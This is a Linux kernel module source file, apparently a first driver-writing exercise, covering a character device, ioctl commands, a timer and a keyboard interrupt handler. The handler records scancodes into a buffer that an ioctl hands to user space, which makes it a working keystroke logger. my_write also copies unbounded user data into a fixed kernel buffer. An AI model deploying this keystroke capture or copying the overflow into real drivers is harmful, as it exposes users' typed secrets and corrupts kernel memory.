#include<linux/init.h>
#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/kdev_t.h>
#include<linux/cdev.h>
#include<linux/fs.h>
#include<linux/slab.h>
#include<linux/device.h>
#include<linux/ioctl.h>
#include<linux/time.h>
#include<linux/jiffies.h>
#include<linux/interrupt.h>
#include<linux/input.h>
#include <linux/uaccess.h>
#include<asm/io.h>
#include "key_map.h"
#include "my_icotl.h"
#define mem_size 1024
#define IRQ_NO 1


static int scancode;
//uint8_t *key_buffer;
uint8_t my_buffer[mem_size];
int pointer_tracker=0;
//uint8_t **ref_buffer;
unsigned long value;
dev_t dev=0;
DEFINE_SPINLOCK(lock);
static struct class *dev_class;
void keyboard_tasklet_bh(unsigned long );
static struct cdev my_cdev;
uint8_t *kernel_buffer;
static struct timer_list my_timer;
static void my_timer_callback(struct timer_list *data);
static int __init my_driver_init(void);
static void __exit my_driver_exit(void);
static int my_open(struct inode *inode,struct file *file);
static int my_close(struct inode *inode,struct file *file);
static ssize_t my_read(struct file *filp,char __user *buf,size_t len,loff_t *off);
static ssize_t my_write(struct file *filp,const char *buf,size_t len,loff_t *off);
static long my_ioctl(struct file *fd,unsigned int cmd,unsigned long arg);
static void print_date_time(void);
static struct file_operations fops={
	.owner=THIS_MODULE,
 	.read=my_read,
	.write=my_write,
	.open=my_open,
	.release=my_close,
	.unlocked_ioctl=my_ioctl,
};

static void my_timer_callback(struct timer_list *data){
pr_info("Your time has elapsed");
print_date_time();
}

DECLARE_TASKLET(keyboard_tasklet, keyboard_tasklet_bh, 0);
void keyboard_tasklet_bh(unsigned long ht){
int i=0;
int len=sizeof(my_key_mappings)/sizeof(struct key_map_struct);
/*pr_info("executing in bottom half of the interrupt handler");*/
for(i=0;i<len;i++){
if(my_key_mappings[i].key_val==scancode){
//	pr_info("%s",my_key_mappings[i].key_name);
//	key_buffer=my_key_mappings[i].key_name;
	if(pointer_tracker>=1024){
		pointer_tracker=0;
	}
	my_buffer[pointer_tracker]=*my_key_mappings[i].key_name;
	pointer_tracker++;
//	pr_info("%s",key_buffer);
	//pr_info("%s",my_buffer);
	//ref_buffer++;
//	pr_info("%s",ref_buffer);
}
}	

}

static irqreturn_t my_irq_handler(int irq,void *devd){
pr_info("Keyboard interrupt has occured");
spin_lock(&lock);
scancode=inb(0x60);
spin_unlock(&lock);
tasklet_schedule(&keyboard_tasklet);
return IRQ_HANDLED;
}
static void print_date_time(void){
pr_info("%u",jiffies_to_msecs(jiffies));
}
static long my_ioctl(struct file *fd,unsigned int cmd,unsigned long arg){
	switch(cmd){
		
		case SAY_HELLO:
			pr_info("ioctl command says hello\n");
			break;
		case START_COUNTDWN:
			pr_info("ill be starting the counter now\n");
			timer_setup(&my_timer,my_timer_callback,0);
			pr_info("%lu",arg);
			if( copy_from_user(&value ,( unsigned long*)arg, sizeof(value)) )
                        {
                                pr_err("Data Write : Err!\n");
				pr_err("%ld",arg);
				break;
                        }
                        pr_info("Value = %ld\n", value);
			pr_info("timer being set for %ld secs\n",value);
			print_date_time();			
			mod_timer(&my_timer,jiffies+msecs_to_jiffies(value*1000));
			break;
		case READ_LAST_1000_WORDS:
			pr_info("writing last thousand keystrokes  to userspace\n");
		//	pr_info("%s\n",*ref_buffer);
			pr_info("%s\n",my_buffer);
			if(copy_to_user((uint8_t *) arg,my_buffer,mem_size)){
				pr_err("Data read error \n");
				break;
			}
			pr_info("data read done\n");
			break;
		default:
			pr_err("please enter a valid command\n");
			break;
		}
	return 0;
}
 
static int my_open(struct inode *inode,struct file *file){
if((kernel_buffer=kmalloc(mem_size,GFP_KERNEL))==0){
pr_info("Cannot allocate memory in kernel\n");
return -1;
}
pr_info("DEVICE has been opened\n");
	return 0;
}

static int my_close(struct inode *inode,struct file *file){
	kfree(kernel_buffer);
	pr_info("Device file closed\n");
	return 0;
}

static ssize_t my_read(struct file *filp,char __user *buf,size_t len,loff_t *off){
	if(copy_to_user(buf,kernel_buffer,mem_size)){
		pr_err("Data Read:Err\n");
	}
	pr_info("Device file has been read!!\n");
	return mem_size;
}

static ssize_t my_write(struct file *filp,char const *buf,size_t len,loff_t *off){
	if(copy_from_user(kernel_buffer,buf,len)){
		pr_err("Device Write Error!\n");
	}
	pr_info("%s has been received from the user space \n",kernel_buffer);
	pr_info("Device file has been written\n");
	return len;
}

static int __init my_driver_init(void){
	
	if((alloc_chrdev_region(&dev,0,1,"my_Dev"))<0){
		pr_info("Cannot allocate major number \n");
		return -1;
	} pr_info("MAJOR=%d MINOR=%d \n",MAJOR(dev),MINOR(dev)); 
	cdev_init(&my_cdev,&fops);
	
	if((cdev_add(&my_cdev,dev,1))<0){
		pr_info("Cannot add the device to  the system\n");
		goto r_class;
	}

	if((dev_class=class_create(THIS_MODULE,"my_class"))==NULL){
		pr_info("Cannot create struct class \n");
		goto r_class;
}
	/*	if((key_buffer=kmalloc(mem_size,GFP_KERNEL))==0){
	pr_info("cannot allocate keyboard type save memory\n");
	goto r_device;
	}
	ref_buffer=&key_buffer;*/
	if((device_create(dev_class,NULL,dev,NULL,"my_device"))==NULL){
		pr_info("Cannot create device \n");
		goto r_device;
	}
	if(request_irq(IRQ_NO,my_irq_handler,IRQF_SHARED,"my_device",(void *)(my_irq_handler))){
		pr_err("Interrupt not registered\n");
		goto r_irq;
	}else{
	
		pr_info("IRQ registerd on init...");
	}  
	pr_info("Device driver insert done\n");
	return 0;

r_irq:
	free_irq(IRQ_NO,(void *)(my_irq_handler));
r_device:
	class_destroy(dev_class);
	//kfree(key_buffer);
r_class: unregister_chrdev_region(dev,1); 
return -1; 
} 
static void __exit my_driver_exit(void){
	//kfree(key_buffer);
	free_irq(IRQ_NO,(void *)(my_irq_handler));
	device_destroy(dev_class,dev);
	class_destroy(dev_class);
	cdev_del(&my_cdev);
	unregister_chrdev_region(dev,1);
	pr_info("Device Driver Removed\n");
}

module_init(my_driver_init);
module_exit(my_driver_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("SURAJ KANDPAL<suraj.kandpal18@gmail.com>");
MODULE_DESCRIPTION("Driver first try");
MODULE_VERSION("1.0");

